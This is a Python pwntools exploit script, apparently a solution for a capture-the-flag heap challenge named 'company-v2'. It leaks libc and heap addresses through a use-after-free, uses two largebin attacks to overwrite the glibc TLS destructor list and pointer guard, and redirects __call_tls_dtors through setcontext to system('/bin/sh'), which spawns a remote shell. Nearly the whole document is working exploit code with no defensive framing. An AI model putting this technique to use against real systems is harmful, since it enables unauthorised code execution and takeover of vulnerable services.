# use largebin attack twice to tls_dtors_list(@tls-0x50) and pointer_guard(@tls+0x30).
# then __call_tls_dtors --> setcontext --> heap rop

from pwn import *
#context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

#TARGET = './company'
HOST = 'company-v2.chal.crewc.tf'
PORT = 17002

#elf = ELF(TARGET)
def start():
	return remote(HOST, PORT)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()

def a(idx, name, pos=b'HR\x00AAAA', sal=0x123, size = 0x518):
	r.sendlineafter(b'>> ', b'1')
	r.sendlineafter(b': ', str(idx).encode())
	r.sendlineafter(b': ', str(size).encode())
	r.sendafter(b': ', name)
	r.sendafter(b': ', pos)
	r.sendlineafter(b': ', str(sal).encode())
def d(idx):
	r.sendlineafter(b'>> ', b'2')
	r.sendlineafter(b': ', str(idx).encode())
def v(idx):
	r.sendlineafter(b'>> ', b'4')
	r.sendlineafter(b'? ', str(idx).encode())
def fb(me, idx, pay):
	r.sendlineafter(b'>> ', b'3')
	r.sendlineafter(b'? ', str(me).encode())
	r.sendlineafter(b'? ', str(idx).encode())
	r.sendafter(b': ', pay)

def inc(idx, sal):
	r.sendlineafter(b'>> ', b'5')
	r.sendlineafter(b'? ', str(idx).encode())
	r.sendlineafter(b': ', str(sal).encode())

def rol(v, key, n=0x11, bits = 64):
	x = v ^ key
	hi = x >> (bits - n)
	out = (( x << n ) | hi) & ((2 ** bits) -1)
	return out

r.sendlineafter(b'? ', flat(0, 0x61, 0xbeef))

a(0, b'0000', size=0x550)
a(1, b'1111')
a(2, b'2222', size=0x540)
a(3, b'3333')

d(0)
d(2)
v(0)
r.recvuntil(b'Name: ')
leak = u64(r.recvuntil(b'\n', True).ljust(8, b'\x00'))
dbg('leak')
base = leak - 0x1f6ce0
dbg('base')

tls = base - 0x3000 + 0x740
setcontext = base + 0x422f0 + 61
system = base + 0x4ebf0
binsh = base + 0x1b51d2

v(2)
r.recvuntil(b'Name: ')
leak = u64(r.recvuntil(b'\n', True).ljust(8, b'\x00'))
dbg('leak')
heap = leak - 0x0290
dbg('heap')

# fill
a(4, b'4444', size=0x550)
a(5, b'5555', size=0x540)

# setcontext payloads
a(7, b'7777', size=0x550)
fb(0, 7, flat(0x11111111, 0x2222, 0x3333, 0x4444, binsh, 0x6666,0x7777, 0x8888, 0x9999, 0xaaaa, 0xbbbb, heap+0x1008, system,0xeeee,0xffff, 0x0101,0xf11111111, 0xf2222, 0xf3333, 0xf4444, 0xf5555, 0xf6666,0xf7777, 0xf8888, 0xf9999, 0xfaaaa, 0xfbbbb, 0xfcccc, 0xfdddd,0xfeeee,0xfffff, 0xf0101) * (0x200 // 0x100))

# call_tls_dtors payloads
a(6, b'xx', size=0x600)
fb(0, 6, flat(0x11111111, 0x2222, 0x3333, 0x4444, 0x5555, 0x6666,0x7777, 0x8888, 0x9999, 0xaaaa, 0xbbbb, 0xcccc, 0xdddd,0xeeee,0xffff, 0x0101,0xf11111111, 0xf2222, 0xf3333, 0xf4444, 0xf5555, 0xf6666,0xf7777, 0xf8888, 0xf9999, 0xfaaaa, 0xfbbbb, rol(setcontext , (heap + 0x2c70)), 0xfdddd,0xfeeee,0xfffff, 0xf0101) * (0x500 // 0x100))

# free
d(6)

a(8, b'8888')
a(9, b'9999', size=0x540)

a(10, b'AAAA')
a(11, b'BBBB', size=0x530)

a(12, b'CCCC')

d(7)
a(13, b'aaaa', size=0x560)

# write tls_dtors_list
inc(7, tls - 0x50 - 0x20)
d(9)
a(14, b'aaaa', size=0x560)

# write pointer_guard
inc(7, tls + 0x30 - 0x20)
d(11)
a(15, b'aaaa', size=0x560)

r.sendlineafter(b'>> ', b'31333337')

r.interactive()
r.close()
